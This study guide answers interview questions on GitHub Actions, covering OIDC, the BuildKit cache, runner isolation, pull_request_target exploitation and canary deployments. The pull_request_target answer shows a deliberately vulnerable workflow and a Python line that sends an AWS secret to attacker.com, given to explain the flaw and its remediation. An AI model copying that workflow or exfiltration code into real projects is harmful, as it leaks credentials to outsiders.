# Day 63: GitHub Actions CI/CD — Principal/Staff Interview Q&As

Five deep, architectural interview questions with exhaustive answers expected of Senior, Staff, and Principal DevOps & Infrastructure Engineers.

---

## Question 1: Explain the exact cryptographic handshake and security mechanics of GitHub Actions OpenID Connect (OIDC) when authenticating to AWS IAM or GCP Workload Identity.

### Answer
GitHub Actions OIDC replaces static, high-risk credentials (`AWS_ACCESS_KEY_ID` / `AWS_SECRET_ACCESS_KEY`) with **cryptographically verifiable, short-lived JSON Web Tokens (JWTs)**.

```
                           GITHUB ACTIONS OIDC WORKFLOW
+─────────────────────────────────────────────────────────────────────────────+
|                                                                             |
|  1. Runner Job (permissions: id-token: write)                               |
|     │                                                                       |
|     │ Calls GitHub local token API via $ACTIONS_ID_TOKEN_REQUEST_URL        |
|     ▼                                                                       |
|  2. GitHub OIDC Provider (token.actions.githubusercontent.com)              |
|     │                                                                       |
|     │ Mints OIDC JWT signed with GitHub's RSA private key                   |
|     │ Injects Claims: `iss`, `aud`, `sub` (repo:org/name:ref:refs/heads/main)|
|     ▼                                                                       |
|  3. Cloud STS Endpoint (e.g. AWS Security Token Service)                    |
|     │                                                                       |
|     ├─► Fetches GitHub's Public Key from OIDC JWKS URL                      |
|     ├─► Validates cryptographic signature on the JWT                        |
|     ├─► Verifies IAM Role Trust Policy (Audience == "sts.amazonaws.com")   |
|     └─► Evaluates StringLike Condition against Subject Claim (`sub`)        |
|     ▼                                                                       |
|  4. Ephemeral Credentials Returned                                          |
|     Returns temporary AWS Session Tokens (AccessKey, Secret, SessionToken)  |
|     valid for exactly 1 hour. Zero static credentials stored in GitHub!     |
|                                                                             |
+─────────────────────────────────────────────────────────────────────────────+
```

### Claims Verification
The AWS IAM Role Trust Policy relies on the `sub` (Subject) claim embedded within the GitHub JWT:
- `sub: "repo:VimalN2005/Backend-ai-engineering:ref:refs/heads/main"`
- If an attacker forks your repository and triggers the same workflow from their fork, their token's subject claim will read `repo:attacker/Backend-ai-engineering:...`, which AWS STS rejects instantly, preventing unauthorized role assumption.

---

## Question 2: How does Docker BuildKit's GitHub Actions Cache (`type=gha`) work under the hood, and how do you manage its limits?

### Answer
Traditional Docker caching inside CI requires pulling the previous image from a registry (`cache-from: my-registry/app:latest`), which requires full layer downloads and registry authentication overhead.

### BuildKit GHA Cache Architecture
The `type=gha` cache backend integrates Docker BuildKit directly with the **GitHub Actions Cache Service API**:

1. **Layer Export (`cache-to: type=gha,mode=max`)**:
   - As BuildKit executes each instruction (`RUN`, `COPY`), it serializes intermediate filesystem diffs into tarballs and streams them directly into GitHub's internal cache storage.
   - Using `mode=max` instructs BuildKit to cache layers from **all stages of a multi-stage Dockerfile**, including the compiler/builder stage (compilers, wheels, temporary build tools). The default `mode=min` caches only the final stage!
2. **Layer Import (`cache-from: type=gha`)**:
   - On subsequent builds, BuildKit queries the GitHub Actions cache service by layer digest.
   - Cache hits are fetched over GitHub's ultra-low-latency internal data fabric (10 Gbps+), bypassing external registry bandwidth.
3. **Storage & Eviction Policies**:
   - GitHub Actions imposes a strict **10 GB total cache limit per repository**.
   - If total cached artifacts exceed 10 GB, GitHub applies a **Least Recently Used (LRU)** eviction policy.
   - To prevent cache thrashing, separate pip dependency caches from Docker layer caches by assigning explicit scopes:
     ```yaml
     cache-from: type=gha,scope=backend-docker
     cache-to: type=gha,mode=max,scope=backend-docker
     ```

---

## Question 3: Compare GitHub-Hosted Runners vs. Self-Hosted Runners across security boundaries, ephemeral isolation, and cost at scale.

### Answer

```
+─────────────────────+─────────────────────────────+─────────────────────────────+
| Dimension           | GitHub-Hosted Runners       | Self-Hosted Runners         |
+─────────────────────+─────────────────────────────+─────────────────────────────+
| Isolation Boundary  | Clean, single-use Azure VM  | Persistent VM or K8s Pod    |
| Persistence Hazard  | ZERO persistence (Ephemeral)| Host file/process pollution |
| Private VPC Access  | Requires VPN / OIDC proxy   | Direct native VPC peering   |
| Hardware (GPUs/ARM) | Standard x86/ARM VMs        | Custom GPUs, high-RAM bare  |
| Cost Model          | Pay-per-minute consumption  | Fixed compute infrastructure|
| Security Compliance | SOC2 / ISO certified by MS  | Customer owns security/patch|
+─────────────────────+─────────────────────────────+─────────────────────────────+
```

### Critical Security Consideration
- **GitHub-Hosted**: Every single job executes on a freshly spun-up VM that is destroyed immediately upon job completion. No residual tokens, files, or processes survive.
- **Self-Hosted Risk on Public Repositories**: **Never use persistent self-hosted runners on public repositories**. An attacker can submit a pull request containing a malicious workflow that modifies host files, installs rootkits, or reads credentials from other jobs running on the same runner node.
- **Enterprise Best Practice**: For self-hosted runners, use **Actions Runner Controller (ARC)** on Kubernetes, which dynamically provisions ephemeral single-use pods per job and destroys the pod immediately after execution.

---

## Question 4: What is the `pull_request_target` exploit in GitHub Actions, and how does it enable arbitrary secret exfiltration from forks?

### Answer

### The Event Trigger Conflict
- `on: pull_request`: Executes with the code from the **fork** (the untrusted pull request branch). It has **read-only permissions** and **zero access to repository secrets**.
- `on: pull_request_target`: Executes with the code from the **base repository** (e.g. `main`) and has **full access to repository secrets** and write permissions.

### The Attack Vector (Pwn Request)
Developers often switch to `pull_request_target` so their CI can run automated integration tests or label PRs from forks that need database credentials.

If the workflow contains:
```yaml
on: pull_request_target

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout Untrusted PR Code
        uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }} # CHECKING OUT UNTRUSTED FORK!

      - name: Run Tests
        env:
          AWS_KEY: ${{ secrets.AWS_ACCESS_KEY }}
        run: pytest # ATTACKER RUNS ARBITRARY CODE WITH SECRETS ACCESSIBLE!
```
1. The attacker submits a PR modifying `tests/test_api.py` to add:
   ```python
   import os, urllib.request
   urllib.request.urlopen("https://attacker.com/steal?k=" + os.environ["AWS_KEY"])
   ```
2. Because `pull_request_target` grants secret access, GitHub Actions populates `$AWS_KEY`.
3. The runner executes the attacker's test script, exfiltrating the AWS secret.

### Remediation
- Never check out untrusted pull request code in a workflow triggered by `pull_request_target`.
- Use `pull_request_target` strictly for metadata tasks (labeling, commenting via `GITHUB_TOKEN`).
- Use two-stage pipelines: untrusted PRs run unprivileged tests; a separate workflow triggered by authorized maintainer approval runs deployments.

---

## Question 5: How do you design an automated, zero-downtime Canary deployment pipeline with automated metric rollback in GitHub Actions?

### Answer

### Canary Deployment Architecture
A Canary release routes a small percentage of production traffic (e.g. 5%) to new container instances while monitoring error rates before promoting to 100%.

```
                            CANARY DEPLOYMENT PIPELINE
+─────────────────────────────────────────────────────────────────────────────+
|                                                                             |
|  1. Deploy Canary Task Definition (5% Traffic routed via ALB / Istio)       |
|     │                                                                       |
|     ▼                                                                       |
|  2. Watchdog Monitoring Phase (5-Minute Evaluation Window)                   |
|     Query Prometheus / Datadog API for:                                     |
|     - HTTP 5xx error rate > 0.5%                                            |
|     - P99 latency > 250ms                                                   |
|     │                                                                       |
|     ├───────────────────────────────┬───────────────────────────────┐       |
|     ▼ [Anomalies Detected]          ▼ [Metrics Nominal]             |
|  3a. Automated Rollback Action   3b. Full Production Promotion              |
|     - Reset traffic route to 0%      - Scale Canary to 100%                 |
|     - Terminate Canary instances     - Terminate old baseline instances     |
|     - Post Alert to PagerDuty/Slack  - Emit Successful Step Summary          |
|                                                                             |
+─────────────────────────────────────────────────────────────────────────────+
```

### GitHub Actions Workflow Implementation
```yaml
jobs:
  canary-release:
    runs-on: ubuntu-latest
    steps:
      - name: Deploy Canary (5% Weight)
        run: ./scripts/deploy_canary.sh --weight 5 --version ${{ github.sha }}

      - name: Metric Watchdog Probe (5-minute soak test)
        run: |
          python ./scripts/watchdog_metrics.py \
            --prometheus-url ${{ secrets.PROMETHEUS_URL }} \
            --error-rate-threshold 0.005 \
            --duration-sec 300

      - name: Rollback Canary on Failure
        if: failure()
        run: |
          echo "[CRITICAL] Metrics breached thresholds! Initiating instant rollback..."
          ./scripts/deploy_canary.sh --weight 0 --version ${{ github.sha }}
          curl -X POST -H 'Content-type: application/json' \
            --data '{"text":"🚨 Canary deployment failed and was rolled back!"}' \
            ${{ secrets.SLACK_WEBHOOK_URL }}
          exit 1

      - name: Promote Canary to 100%
        if: success()
        run: ./scripts/deploy_canary.sh --weight 100 --version ${{ github.sha }}
```
